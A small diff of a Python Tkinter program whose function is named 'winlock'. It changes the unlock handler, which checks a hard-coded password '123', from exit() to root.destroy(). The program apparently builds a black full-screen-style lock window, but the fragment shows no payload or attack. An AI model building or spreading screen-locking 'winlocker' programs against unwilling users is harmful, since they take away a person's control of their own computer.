@@ -10,7 +10,7 @@ def winlock():
 
     def CheckPassword(arg):
         if password.get() == '123':
-            exit()
+            root.destroy()
     bg = "black"
     font = "Arial 25 bold"
     root["bg"] = bg
